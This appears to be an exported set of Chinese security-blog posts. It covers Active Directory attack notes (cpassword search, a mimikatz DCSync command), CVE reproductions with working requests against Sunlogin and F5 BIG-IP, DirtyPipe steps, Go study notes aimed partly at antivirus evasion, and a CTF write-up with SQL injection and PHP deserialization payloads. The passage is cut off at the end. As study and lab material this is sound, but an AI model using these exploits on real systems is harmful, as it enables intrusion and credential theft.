<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">findstr &#x2F;S &#x2F;I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br></pre></td></tr></table></figure>









<p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
<p><a href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></p>
<h1 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm-relay"></a>ntlm-relay</h1><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p><a href="https://cloud.tencent.com/developer/article/1899592">域渗透之委派攻击详解（非约束委派/约束委派/资源委派） - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s/uKe-qAJiXqOQVhiAWB43qg">委派攻击 (qq.com)</a></p>
<p>只有服务账号/机器账号才能设置委派</p>
<h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><h3 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
<p><a href="https://mp.weixin.qq.com/s/WyFeKkmzIjqcbP5uciDW6Q">https://mp.weixin.qq.com/s/WyFeKkmzIjqcbP5uciDW6Q</a></p>
<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><p>域控独特端口：ladp 389</p>
<h3 id="域内漏洞"><a href="#域内漏洞" class="headerlink" title="域内漏洞"></a>域内漏洞</h3><p>CVE-2019-1040（攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制Windows域内的任何机器，包括域控服务器。）</p>
<p>ZeroLogon(CVE-2020-1472)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击者可以向域发起Netlogon 计算机账户认证请求, 使用8字节全0 client challenge 不断尝试得到一个正确的8字节全0 client credential 通过认证，再通过相关调用完成对域控密码的修改。</span><br></pre></td></tr></table></figure>



<p>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</p>
<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p>CVE-2021-1675 Windows Print Spooler权限提升漏洞复现</p>
<p>17010</p>
<p>CVE-2020-0796(永恒之黑)</p>
<h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><p>原理即域控自己数据同步，同步NTDS.dit</p>
<ul>
<li>需要获得以下任一用户的权限：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br><span class="line">exchange trusted subsystem组内账户&#96; (需要写ACL)&#96; 暂时不会</span><br></pre></td></tr></table></figure>



<ol>
<li><p>pth/ptt/runas</p>
</li>
<li><p>mimikatz：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>secretsdump</strong>+ ntds.dit</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3>]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>AD域的攻击方式</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE复现</title>
    <url>/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="向日葵远程代码执行"><a href="#向日葵远程代码执行" class="headerlink" title="向日葵远程代码执行"></a>向日葵远程代码执行</h3><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p><strong>向日葵远程控制</strong>是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</p>
<p>（CNVD-2022-10270/CNVD-2022-03672），影响Windows系统使用的个人版和简约版。 该漏洞发生在接口``/check`处，</p>
<p>此漏洞端口一般大于40000</p>
<a id="more"></a>

<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11.1.1</span><br><span class="line"></span><br><span class="line">10.3.0.27372</span><br><span class="line"></span><br><span class="line">11.0.0.33162      （不一定准确）</span><br></pre></td></tr></table></figure>



<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><blockquote>
<p>手工测试：</p>
</blockquote>
<p>首先我们要确定目标端口(扫描开放端口，一般在 40000以上)，然后访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.102:49414&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225345974.png" alt="image-20220320225345974"></p>
<p>获取token</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.102:49414&#x2F;cgi-bin&#x2F;rpc?action&#x3D;verify-haras</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225428763.png" alt="image-20220320225428763"></p>
<p>“verify_string” 的值会刷新改变，但这个下面我们和CID:组成cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check?cmd&#x3D;ping..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;ipconfig</span><br><span class="line"></span><br><span class="line">添加  Cookie: CID&#x3D;sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1</span><br></pre></td></tr></table></figure>



<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320230404045.png" alt="image-20220320230404045"></p>
<blockquote>
<p>脚本测试：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-xn&#x2F;sunlogin_rce</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xrkRce.exe -h 192.168.1.102 -t scan</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320224603734.png" alt="image-20220320224603734"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xrkRce.exe -h 192.168.1.102 -t rce -p 49414 -c &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225054179.png" alt="image-20220320225054179"></p>
<p>参考：</p>
<p><a href="https://www.cnblogs.com/cn-gov/p/15952459.html">https://www.cnblogs.com/cn-gov/p/15952459.html</a></p>
<h3 id="CVE-2022-0543-Redis-Lua-沙箱绕过"><a href="#CVE-2022-0543-Redis-Lua-沙箱绕过" class="headerlink" title="CVE-2022-0543   Redis Lua 沙箱绕过"></a>CVE-2022-0543   Redis Lua 沙箱绕过</h3><p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA">https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA</a></p>
<h3 id="CVE-2022-1388-F5-BIG-IP远程代码执行漏洞"><a href="#CVE-2022-1388-F5-BIG-IP远程代码执行漏洞" class="headerlink" title="CVE-2022-1388  F5 BIG-IP远程代码执行漏洞"></a>CVE-2022-1388  F5 BIG-IP远程代码执行漏洞</h3><p>该漏洞允许未经身份验证的攻击者通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，以执行任意系统命令、创建或删除文件以及禁用BIG-IP上的服务。</p>
<p>poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;mgmt&#x2F;tm&#x2F;util&#x2F;bash HTTP&#x2F;1.1</span><br><span class="line">Host: &lt;redacted&gt;:8443</span><br><span class="line">Authorization: Basic YWRtaW46</span><br><span class="line">Connection: keep-alive, X-F5-Auth-Token</span><br><span class="line">X-F5-Auth-Token: 0</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;: &quot;run&quot; , &quot;utilCmdArgs&quot;: &quot; -c &#39;id&#39; &quot; &#125;   ( id换成rec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/0xf4n9x/CVE-2022-1388">0xf4n9x/CVE-2022-1388：CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE (github.com)</a></p>
<h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><h5 id="CVE-2022-22965-Spring-Framework-RCE-Early-Announcement"><a href="#CVE-2022-22965-Spring-Framework-RCE-Early-Announcement" class="headerlink" title="CVE-2022-22965  Spring Framework RCE, Early Announcement"></a>CVE-2022-22965  Spring Framework RCE, Early Announcement</h5><p><a href="https://blog.csdn.net/weixin_45794666/article/details/123918066">(28条消息) Spring Framework RCE(CVE-2022-22965)_6right的博客-CSDN博客</a></p>
<h5 id="CVE-2022-22947-Spring-Cloud-Gateway"><a href="#CVE-2022-22947-Spring-Cloud-Gateway" class="headerlink" title="CVE-2022-22947   Spring Cloud Gateway"></a>CVE-2022-22947   Spring Cloud Gateway</h5><p><a href="https://www.cnblogs.com/syroot/p/15978762.html">Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947） - 三亿人 - 博客园 (cnblogs.com)</a></p>
<h3 id="Structs2"><a href="#Structs2" class="headerlink" title="Structs2"></a>Structs2</h3><h5 id="Structs2-026-RCE"><a href="#Structs2-026-RCE" class="headerlink" title="Structs2-026 RCE"></a>Structs2-026 RCE</h5><p>新出的 ，CVE-2021-31805</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Struts 2.0.0-2.5.29</span><br></pre></td></tr></table></figure>



<p><a href="https://mp.weixin.qq.com/s/B17fFD3xDYvNib6LhUS9dA">https://mp.weixin.qq.com/s/B17fFD3xDYvNib6LhUS9dA</a></p>
<h3 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h3><h5 id="ThinkPHP-6-0-12LTS-反序列漏洞分析"><a href="#ThinkPHP-6-0-12LTS-反序列漏洞分析" class="headerlink" title="ThinkPHP 6.0.12LTS 反序列漏洞分析"></a>ThinkPHP 6.0.12LTS 反序列漏洞分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ThinkPHP 6.0.12LTS(目前最新版本)；</span><br></pre></td></tr></table></figure>



<p><a href="https://mp.weixin.qq.com/s/xgolXMP8QkeQRH8ylm86dg">https://mp.weixin.qq.com/s/xgolXMP8QkeQRH8ylm86dg</a></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="CVE-2022-0847-Linux-本地内核提权漏洞"><a href="#CVE-2022-0847-Linux-本地内核提权漏洞" class="headerlink" title="CVE-2022-0847 Linux 本地内核提权漏洞"></a>CVE-2022-0847 Linux 本地内核提权漏洞</h3><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>堪称新版脏牛。Dirty Pipe</p>
<p>该漏洞源于新管道缓冲区结构的“flag”变量在 Linux 内核中的 copy_page_to_iter_pipe 和 push_pipe 函数中缺乏正确初始化。非特权本地用户利用该漏洞可以提升权限至root。</p>
<p>允许非特权用户注入和覆盖任意只读文件中的数据，非特权用户通过替换/etc/passwd文件中root用户的hash值达到权限提升的目的。</p>
<p>exp 链接：<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p>
<h5 id="适用范围："><a href="#适用范围：" class="headerlink" title="适用范围："></a>适用范围：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux Kernel版本 &gt;&#x3D; 5.8</span><br><span class="line"></span><br><span class="line">Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102 </span><br></pre></td></tr></table></figure>



<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version    #查看linux内核版本</span><br><span class="line"></span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line"></span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220310212912716.png" alt="image-20220310212912716"></p>
<p>原理：<a href="https://mp.weixin.qq.com/s/cHuO8TO4IvGgslvipJGQ2A">漏洞通告：CVE-2022-0847linux内核提权漏洞复现/原理讲解 (qq.com)</a></p>
<p><a href="https://www.freebuf.com/company-information/324470.html">https://www.freebuf.com/company-information/324470.html</a></p>
<p><a href="https://zone.huoxian.cn/d/978-cve-2022-0847-dirtypipe-linux">CVE-2022-0847_DirtyPipe Linux 内核提权漏洞分析及复现 - 火线 Zone-云安全社区 (huoxian.cn)</a></p>
<h3 id="打印机提权漏洞"><a href="#打印机提权漏洞" class="headerlink" title="打印机提权漏洞"></a>打印机提权漏洞</h3><p>CVE-2020-1337</p>
<p>CVE-2020–1030 </p>
<p>CVE-2020–1048</p>
<p>CVE-2022-21999  打印机提权漏洞  </p>
<p>环境原因没有复现成功</p>
<p>参考：</p>
<p>原理：<a href="https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81">https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81</a></p>
<p>poc：<a href="https://github.com/ly4k/SpoolFool">https://github.com/ly4k/SpoolFool</a></p>
<h3 id="CVE-2022–26923Active-Directory-域权限提升漏洞"><a href="#CVE-2022–26923Active-Directory-域权限提升漏洞" class="headerlink" title="CVE-2022–26923Active Directory 域权限提升漏洞"></a>CVE-2022–26923Active Directory 域权限提升漏洞</h3><ul>
<li>由于对用户属性的不正确获取，允许低权限用户在安装了 Active Directory 证书服务（AD CS）服务器角色的 Active Directory 环境中将权限提升至域管理员。</li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Go</title>
    <url>/2022/03/21/Go/</url>
    <content><![CDATA[<p>Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。</p>
<h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>学习go写脚本和 免杀（其他大佬的有些免杀也是用go写的，效果不错，也算是为了能看懂代码吧）</p>
<p>go 没有类，有结构体，有指针，（主要是利用函数）。</p>
<a id="more"></a>

<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>go build</strong>生成二进制文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go build xxx.go</span><br></pre></td></tr></table></figure>

<p>结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">包声明   package</span><br><span class="line">引入包   import (&quot;&quot; &quot;&quot; &quot;&quot; &quot;xx&#x2F;xxx&quot;)</span><br><span class="line">函数     func function_name( [parameter list] ) [return_types] &#123;  函数体 &#125;</span><br><span class="line">变量     var xxx&#x3D;&quot;str&quot;  </span><br><span class="line">常量     const</span><br><span class="line">语句 &amp; 表达式  </span><br><span class="line">注释      </span><br></pre></td></tr></table></figure>

<!--more-->



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main  定义了包名</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  调用 fmt 包</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;菜鸟教程&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello go&quot;</span> + <span class="string">&quot;good&quot;</span>,<span class="string">&quot;good&quot;</span>)</span><br><span class="line"></span><br><span class="line">	test()</span><br><span class="line">	<span class="keyword">var</span> age <span class="keyword">int</span></span><br><span class="line">	age = <span class="number">11</span></span><br><span class="line">	fmt.Println(age)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="golang包"><a href="#golang包" class="headerlink" title="golang包"></a>golang包</h3><p>包用来区分命名空间，一般一个文件夹一个包，package “name” 声明包，文件夹与包名一样，一个文件夹下只有一个包。</p>
<ul>
<li>创建包</li>
</ul>
<p>例如src 文件夹下新建test文件 ，新建 test1.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">xxxx</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>导入包</li>
</ul>
<p>利用go module（1.11开始使用） 管理包依赖</p>
<ol>
<li>初始化模块</li>
</ol>
<p>go mod init  &lt;项目名称&gt;</p>
<ol start="2">
<li>依赖关系处理，通过go.mod文件</li>
</ol>
<p>go mod tidy</p>
<ol start="3">
<li>将依赖包复制到项目到 xxx目录</li>
</ol>
<p>go mod  xxx</p>
<p>如果包被屏蔽(墙),可以使用这个命令，随后使用go build -mod=xxxx编译</p>
<ol start="4">
<li>显示依赖关系</li>
</ol>
<p>go list -m all</p>
<p>go list -m -json all (详细显示)</p>
<ol start="5">
<li>下载依赖</li>
</ol>
<p>go  mod  download [path@version]</p>
<p>学习：<a href="https://www.runoob.com/go">https://www.runoob.com/go</a></p>
<p><a href="https://github.com/Leslie1sMe/golang">Leslie1sMe/golang: Golang的实战项目，学习笔记，代码例程汇总。 (github.com)</a></p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Access注入</title>
    <url>/2021/01/10/Access%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>常见数据库注入</category>
      </categories>
      <tags>
        <tag>Access注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle注入</title>
    <url>/2021/01/10/Oracle%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>常见数据库注入</category>
      </categories>
      <tags>
        <tag>Oracel注入</tag>
      </tags>
  </entry>
  <entry>
    <title>MARDASCTF2021</title>
    <url>/2021/05/02/MARDASCTF2021/</url>
    <content><![CDATA[<h2 id="BestDB-sql注入类型"><a href="#BestDB-sql注入类型" class="headerlink" title="BestDB -sql注入类型"></a>BestDB -sql注入类型</h2><p><img src="/2021/05/02/MARDASCTF2021/1.png" alt="1"></p>
<p>一看就感觉存在sql注入，重点是如何闭合，绕过。</p>
<a id="more"></a>

<p>F12 发现      <code>$sql = &quot;SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \&quot;$query\&quot;&quot;;</code></p>
<p>刚开始没有注意到 <code>OR username = \&quot;$query\&quot;&quot;;</code> giao ,一直在通过进行注入，但是都  Forbidden!!!了，过滤了单引号</p>
<p>然后尝试输入username尝试，当$query值为lisi时候我们进行闭合会有回显，而且只有个简单的空格过滤，/**/绕过即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lisi&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;1# 回显正常</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2# 报错</span><br><span class="line">说明存在注入。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lisi&quot;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3#  回显正常</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;4#  不回显。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查数据库名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(schema_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.schemata)2,3# </span><br><span class="line">可有可无这</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/02/MARDASCTF2021/2.png" alt="2"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查表名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),2,3#   </span><br><span class="line"></span><br><span class="line">过滤了单引号&#39;dataabse()&#39;就不能使用,</span><br><span class="line">正常在数据库查询，表名需带反引号，在php端中并不需要</span><br><span class="line"></span><br><span class="line">f1agdas,users两个表</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查字段名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;),2,3# </span><br><span class="line"></span><br><span class="line">&quot;f1agdas&quot;记得双引号</span><br><span class="line"></span><br><span class="line">id,f1agdas</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查数据</span><br><span class="line"></span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;f1agdas&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas),2,3#</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;load_file(0x2f666c61672e747874)),2,3#</span><br><span class="line"></span><br><span class="line">&#x2F;flag.txt进行十六进制或者CHAR()是为了绕过对&quot;&#x2F;&quot;过滤</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/02/MARDASCTF2021/3.png" alt="3"></p>
<h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>先贴上源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params">$code</span>)</span>&#123;</span><br><span class="line">        $pattern = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>

<p><a href="https://www.anquanke.com/post/id/167140#h2-5">https://www.anquanke.com/post/id/167140#h2-5</a></p>
<p>以前没有见过，这里存在动态拼接类，我们需要原生类进行去读文件。</p>
<p>一.可遍历目录类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DirectoryIteratorFilesystemIterator</span><br></pre></td></tr></table></figure>

<p><code>GlobIterator</code> 与上面略不同，该类可以通过模式匹配来寻找文件路径。</p>
<p>二.可读取文件类</p>
<p><code>SplFileObject</code> 在此函数中，URL 可作为文件名，不过也要受到<code>allow_url_fopen</code>影响</p>
<p>参考<a href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    public $class &#x3D; &#39;FilesystemIterator&#39;;    public $para &#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;;    public $check ;&#125;$pop&#x3D;new A();$pop&#x3D;serialize($pop);var_dump($pop);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/02/MARDASCTF2021/4.png" alt="4"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    public $class&#x3D;&#39;SplFileObject&#39;;    public $para&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&#x2F;flag.php&quot;;    public $check;    &#125;$o  &#x3D; new A();echo serialize($o);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/02/MARDASCTF2021/5.png" alt="5"></p>
<hr>
<p>利用原生类来反序列化，题目我第一次见，参考了网上的博客，</p>
<p>因为php原生类有很多的特定功能。</p>
<hr>
<p><a href="https://shimo.im/docs/V1hLlJ0RoRkI7Si9/">https://shimo.im/docs/V1hLlJ0RoRkI7Si9/</a>  各位大佬wp</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MARDASCTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
